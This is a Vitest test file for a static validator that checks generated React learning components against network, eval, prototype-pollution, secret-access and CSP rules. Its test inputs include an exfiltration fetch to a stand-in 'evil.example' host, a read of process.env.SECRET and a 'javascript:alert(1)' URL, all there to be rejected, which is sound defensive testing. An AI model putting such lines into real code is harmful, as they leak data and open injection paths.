import { describe, it, expect } from "vitest";
import { staticValidator, formatViolations, validateSource } from "@/lib/harness/validator";

describe("StaticValidator (G2)", () => {
  it("rejects a forbidden fetch/network call", () => {
    const src = `import { useState } from "react";
export function Manipulative() {
  fetch("https://evil.example/exfil");
  return null;
}`;
    const result = staticValidator.validate(src);
    expect(result.ok).toBe(false);
    expect(result.violations.some((v) => v.rule === "NETWORK_API")).toBe(true);
  });

  it("rejects an import outside the allowlist", () => {
    const src = `import axios from "axios";
export function Manipulative() { return null; }`;
    const result = staticValidator.validate(src);
    expect(result.ok).toBe(false);
    expect(result.violations.some((v) => v.rule === "IMPORT_NOT_ALLOWED")).toBe(true);
  });

  it("does not flag a forbidden word that only appears in a block comment", () => {
    const src = `import { useState } from "react";
/* TODO: maybe fetch() this from a CMS one day */
export function Manipulative() { return useState(0); }`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "NETWORK_API")).toBe(false);
  });

  it("does not break out of a string early on an escaped quote", () => {
    const src = `import { useState } from "react";
export function Manipulative() {
  const label = "a \\"quoted\\" fetch word stays inert";
  return useState(label);
}`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "NETWORK_API")).toBe(false);
  });

  it("does not flag a forbidden word that only appears in a string label", () => {
    const src = `import { useState } from "react";
export function Manipulative() {
  const label = "drag to fetch more pieces"; // 'fetch' is only prose
  return label.length;
}`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "NETWORK_API")).toBe(false);
  });

  it("accepts a clean allowlisted manipulative", () => {
    const src = `import { useState } from "react";
import { FractionBar, Slider } from "@chalkbox/kit";
export function Manipulative() {
  const [d, setD] = useState(1);
  return { d, setD, bar: FractionBar, s: Slider };
}`;
    const result = staticValidator.validate(src);
    expect(result.ok).toBe(true);
    expect(result.violations).toHaveLength(0);
  });

  it("flags dynamic eval via a bare eval() call", () => {
    const src = `export function Manipulative() { eval("1+1"); return null; }`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "DYNAMIC_EVAL")).toBe(true);
  });

  it("flags dynamic code construction via new Function(...)", () => {
    const src = `export function Manipulative() { const f = new Function("return 1"); return f(); }`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "DYNAMIC_EVAL")).toBe(true);
  });

  it("flags proto-pollution markers", () => {
    // __proto__ is matched as a standalone identifier (e.g. an object-literal
    // key); the scanner deliberately excludes the `obj.__proto__` dotted form
    // from this token so as not to over-match ordinary member access chains.
    const src = `export function Manipulative() { const x = { __proto__: {} }; return x; }`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "PROTO_POLLUTION")).toBe(true);
  });

  it("flags the dotted constructor.constructor proto-pollution marker", () => {
    const src = `export function Manipulative() { return ({}).constructor.constructor; }`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "PROTO_POLLUTION")).toBe(true);
  });

  it("flags a generic forbidden global that is not network/eval/proto", () => {
    const src = `export function Manipulative() { return process.env.SECRET; }`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "FORBIDDEN_GLOBAL")).toBe(true);
  });

  it("flags a javascript: URL as CSP-incompatible", () => {
    const src = `export function Manipulative() { const href = "javascript:alert(1)"; return href; }`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "CSP_INCOMPATIBLE")).toBe(true);
  });

  it("flags a grossly unbalanced source as a parse error", () => {
    const src = `export function Manipulative() { return ((((1;`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "PARSE_ERROR")).toBe(true);
  });

  it("does not flag a small, tolerated brace skew as a parse error", () => {
    // Only a single-bracket imbalance — the scanner tolerates this.
    const src = `export function Manipulative() { return 1; }`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "PARSE_ERROR")).toBe(false);
  });

  it("flags a module that exceeds the node-count size cap", () => {
    const src = `export function Manipulative() {\n${"const a = 1;\n".repeat(6000)}return null;\n}`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "MODULE_TOO_LARGE")).toBe(true);
  });

  it("flags a module that exceeds the max nesting-depth cap", () => {
    const src = `export function Manipulative() { return ${"(".repeat(45)}1${")".repeat(45)}; }`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "UNBOUNDED_LOOP_HINT")).toBe(true);
  });

  it("reports meta counts (importCount) for a multi-import source", () => {
    const src = `import { useState } from "react";
import { Slider } from "@chalkbox/kit";
export function Manipulative() { return useState(Slider); }`;
    const result = staticValidator.validate(src);
    expect(result.meta.importCount).toBe(2);
  });

  it("validateSource is a functional wrapper around the singleton validator", () => {
    const src = `export function Manipulative() { return null; }`;
    expect(validateSource(src)).toEqual(staticValidator.validate(src));
  });

  it("formatViolations renders a compact, greppable trace string", () => {
    const src = `import axios from "axios";\nexport function Manipulative() { fetch("x"); return null; }`;
    const result = staticValidator.validate(src);
    const formatted = formatViolations(result);
    expect(formatted).toContain("IMPORT_NOT_ALLOWED at");
    expect(formatted).toContain("NETWORK_API at");
    expect(formatted.split("\n")).toHaveLength(result.violations.length);
  });

  it("formatViolations returns an empty string for a clean result", () => {
    const result = staticValidator.validate(`export function Manipulative() { return null; }`);
    expect(formatViolations(result)).toBe("");
  });
});
